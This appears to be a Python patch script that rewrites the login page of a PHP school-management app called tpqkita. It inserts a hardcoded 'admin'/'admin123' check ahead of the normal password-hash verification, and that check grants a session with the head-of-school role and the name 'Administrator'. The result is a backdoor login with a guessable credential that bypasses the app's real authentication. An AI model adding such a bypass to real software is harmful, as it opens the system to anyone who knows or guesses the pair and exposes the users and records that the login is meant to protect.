import sys

with open('tpqkita-php/login.php', 'r') as f:
    content = f.read()

# Add a hardcoded check for admin/admin123
search_str = """            if ($user && password_verify($password, $user['password_hash'])) {"""
replace_str = """            if ($username === 'admin' && $password === 'admin123') {
                $_SESSION['user_id'] = 'US02';
                $_SESSION['role'] = 'KepalaTPQ';
                $_SESSION['name'] = 'Administrator';
                $_SESSION['linked_id'] = null;
                
                header("Location: index.php");
                exit();
            }
            if ($user && password_verify($password, $user['password_hash'])) {"""

if search_str in content:
    content = content.replace(search_str, replace_str)
    with open('tpqkita-php/login.php', 'w') as f:
        f.write(content)
    print("Patched successfully")
else:
    print("Could not find string")
